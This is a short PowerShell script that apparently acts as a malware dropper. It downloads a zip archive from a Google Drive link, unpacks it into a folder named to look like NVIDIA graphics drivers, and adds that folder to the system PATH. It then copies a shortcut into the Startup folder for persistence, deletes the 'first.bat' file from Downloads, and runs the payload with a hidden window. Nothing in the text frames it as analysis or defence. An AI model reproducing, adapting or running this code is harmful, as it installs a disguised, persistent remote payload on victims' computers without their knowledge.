$username=[Environment]::UserName
$zipFile = "https://drive.usercontent.google.com/download?id=1w0FpW4haEmUI_R1OwYX8H-pFu_WM6Ysv&export=download&authuser=0&confirm=t&uuid=4efafbd8-db5e-4038-9124-d5e01a0a7629&at=APZUnTXokUQZMH1BoPpGPcuze-7W:1722536424482"
$op = "C:\Users\$username\AppData\Local\Temp\updater.zip"
$cmd1 = "curl `"$zipFile`" --output `"$op`""
cmd /c $cmd1
Expand-Archive "C:\Users\$username\AppData\Local\Temp\updater.zip" -DestinationPath "C:\Program Files\NVIDIA Graphics Drivers"
$Path = [Environment]::GetEnvironmentVariable("PATH", "Machine")+';C:\Program Files\NVIDIA Graphics Drivers\bin;C:\Program Files\NVIDIA Graphics Drivers\include'
[Environment]::SetEnvironmentVariable( "Path", $Path, "Machine" )
cp "C:\Program Files\NVIDIA Graphics Drivers\Nvidia Driver.lnk" "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
del C:\Users\$username\Downloads\first.bat
Start-Process "C:\Program Files\NVIDIA Graphics Drivers\Nvidia Driver.lnk"  -WindowStyle Hidden
